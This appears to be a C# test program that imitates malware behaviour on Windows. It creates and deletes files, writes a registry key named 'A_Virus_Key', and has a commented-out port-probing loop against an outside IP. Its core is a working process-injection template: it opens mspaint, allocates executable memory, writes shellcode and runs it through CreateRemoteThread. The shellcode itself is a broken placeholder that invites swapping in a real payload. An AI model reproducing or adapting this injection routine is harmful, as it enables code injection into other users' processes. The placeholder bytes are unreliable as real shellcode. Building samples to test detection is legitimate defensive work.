using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Net;
using System.Diagnostics;

namespace regular_exe
{
    internal class Program
    {
        /// Sockets
        // Import the socket function
        [DllImport("Ws2_32.dll", SetLastError = true)]
        static extern IntPtr socket(
            int af,
            int type,
            int protocol);

        // Constants for the socket function
        const int AF_INET = 2;
        const int SOCK_STREAM = 1;
        const int IPPROTO_TCP = 6;

        // Import the connect function
        [DllImport("Ws2_32.dll", SetLastError = true)]
        static extern int connect(
            IntPtr socket,
            byte[] socketAddress,
            int socketAddressSize);

        // Files
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern IntPtr CreateFileA(
             [MarshalAs(UnmanagedType.LPStr)] string filename,
             [MarshalAs(UnmanagedType.U4)] FileAccess access,
             [MarshalAs(UnmanagedType.U4)] FileShare share,
             IntPtr securityAttributes,
             [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
             [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes,
             IntPtr templateFile);

        // Import the RegCreateKeyExA function
        [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern int RegCreateKeyExA(
        UIntPtr hKey,
        string lpSubKey,
        int Reserved,
        string lpClass,
        int dwOptions,
        int samDesired,
        IntPtr lpSecurityAttributes,
        out UIntPtr phkResult,
        out int lpdwDisposition);

        // Constants for the RegCreateKeyExA function
        const int REG_OPTION_NON_VOLATILE = 0;
        const int REG_CREATED_NEW_KEY = 1;

        public static UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
        public static UIntPtr HKEY_CURRENT_USER = new UIntPtr(0x80000001u);


        [DllImport("kernel32.dll")]
        static extern void Sleep(int dwMilliseconds);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DeleteFileA([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        // Import the necessary Windows API functions
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, int dwCreationFlags, out IntPtr lpThreadId);


        static void Main(string[] args)
        {
            Sleep(2000);
            IntPtr a = CreateFileA("hello.txt", FileAccess.Write, FileShare.None, IntPtr.Zero, FileMode.CreateNew, FileAttributes.Normal, IntPtr.Zero);

            //uint dwHandle = (uint)CreateThread((IntPtr)0, (uint)4096, (IntPtr)null, (IntPtr)null, (uint)0, (IntPtr)null);
            //if (dwHandle == 0) throw new Exception("Unable to create thread!");
            DeleteFileA("what_is_up.txt");

            // if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, 1, UIntPtr(0) == 0)

            // Open the HKEY_CURRENT_USER root key
            UIntPtr keyHandle;
            int disposition;
            int result = RegCreateKeyExA(
                HKEY_CURRENT_USER,
                "A_Virus_Key",
                0,
                null,
                REG_OPTION_NON_VOLATILE,
                0,
                IntPtr.Zero,
                out keyHandle,
                out disposition);

            //int port = 80;
            //while (port < 83)
            //{

            //    Console.WriteLine($"Trying to connect to host through port {port}");
            //    // Parse the target host and port from the command line arguments
            //    string host = "142.250.186.68";

            //    // Resolve the target host to an IP address
            //    IPHostEntry hostEntry = Dns.GetHostEntry(host);
            //    IPAddress[] addresses = hostEntry.AddressList;

            //    // Create a socket for connecting to the target host
            //    IntPtr socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            //    if (socketHandle == IntPtr.Zero)
            //    {
            //        continue;
            //    }

            //    // Create a socket address for the target host and port
            //    EndPoint endPoint = new IPEndPoint(addresses[0], port);
            //    int endPointSize = endPoint.Serialize();
            //    byte[] socketAddress = new byte[endPointSize];
            //    Buffer.BlockCopy(endPoint.Serialize(), 0, socketAddress, 0, endPointSize);

            //    // Try to connect to the target host and port
            //    result = connect(socketHandle, socketAddress, endPointSize);
            //    if (result != 0)
            //    {
            //        continue;
            //    }
            //    Console.WriteLine($"Successfully connected to host through port {port}");
            //}

            // Get the process ID of the process you want to inject the shell code into
            // Get the process by its name
            Process process = Process.GetProcessesByName("mspaint")[0];

            // Get the process ID
            int processId = process.Id;

            // Open a handle to the process with the necessary privileges
            IntPtr targetProcessHandle = OpenProcess(0x1F0FFF, false, processId);

            // Allocate memory in the process's address space
            IntPtr shellCodeAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, 1024, 0x1000, 0x40);

            // Write the shell code to the allocated memory
            byte[] shellCode = new byte[] {
                0x68, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x21, // push "Hello World!"
                0x68, 0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x6D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x2E, // push "This is a message."
                0xB8, 0x04, 0x00, 0x00, 0x00, // mov eax, 4
                0x6A, 0x00, // push 0
                0xFF, 0xD0 }; // call eax // Replace this with your actual shell code
            WriteProcessMemory(targetProcessHandle, shellCodeAddress, shellCode, shellCode.Length, out IntPtr bytesWritten);

            // Create a remote thread in the process to execute the shell code
            CreateRemoteThread(targetProcessHandle, IntPtr.Zero, 0, shellCodeAddress, IntPtr.Zero, 0, out IntPtr threadId);

        }
    }
}